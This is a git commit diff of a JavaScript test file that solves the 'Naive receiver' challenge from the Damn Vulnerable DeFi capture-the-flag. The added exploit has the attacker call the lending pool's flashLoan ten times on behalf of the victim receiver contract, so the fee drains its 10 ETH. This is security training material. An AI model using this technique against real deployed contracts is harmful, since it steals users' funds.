e68da74e2aa752540130e9e4cbbd3ccc0128434e
Gerdus Marais <gerdusx@gmail.com>
2022-06-17 21:17:20 +0200

    Naive receiver solution

--- Security/CTF/damn-vulnerable-defi/test/naive-receiver/naive-receiver.challenge.js
+++ Security/CTF/damn-vulnerable-defi/test/naive-receiver/naive-receiver.challenge.js
@@ -1,47 +1,58 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Naive receiver', function () {
-    let deployer, user, attacker;
+describe('[Challenge] Naive receiver', async () => {
+    let deployer, user, attacker, pool;
 
     // Pool has 1000 ETH in balance
     const ETHER_IN_POOL = ethers.utils.parseEther('1000');
 
     // Receiver has 10 ETH in balance
-    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
+    const ETHER_IN_USER_CONTRACT = ethers.utils.parseEther('10');
 
-    before(async function () {
+    beforeEach(async () => {
+    //before(async () => {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, attacker] = await ethers.getSigners();
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
 
-        this.pool = await LenderPoolFactory.deploy();
-        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
+        pool = await LenderPoolFactory.deploy();
+        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
         
-        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
-        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
-
-        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
-        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
-        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+        userContract = await FlashLoanReceiverFactory.deploy(pool.address);
+        await deployer.sendTransaction({ to: userContract.address, value: ETHER_IN_USER_CONTRACT });
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+    describe('Initial values', async () => {
+        it('Pool should have the correct amount of ether', async () => {
+            expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
+        });
+
+        it('Pool fixed fee should be 1 ether', async () => {
+            expect(await pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
+        });
+
+        it('User should have the correct amount of ether', async () => {
+            expect(await ethers.provider.getBalance(userContract.address)).to.be.equal(ETHER_IN_USER_CONTRACT);
+        });
     });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+    describe('Exploit', async () => {
+        /** CODE YOUR EXPLOIT HERE */
+        beforeEach(async () => {
+            for (let index = 0; index < 10; index++) {
+                await pool.connect(attacker).flashLoan(userContract.address, ethers.utils.parseEther("0"));
+            }
+        });
 
-        // All ETH has been drained from the receiver
-        expect(
-            await ethers.provider.getBalance(this.receiver.address)
-        ).to.be.equal('0');
-        expect(
-            await ethers.provider.getBalance(this.pool.address)
-        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
+        it('User balance should be 0', async () => {
+            expect(await ethers.provider.getBalance(userContract.address)).to.be.equal('0');
+        });
+
+        it('Pool balance should be pool balance + user balance', async () => {
+            expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_USER_CONTRACT));
+        });
     });
 });
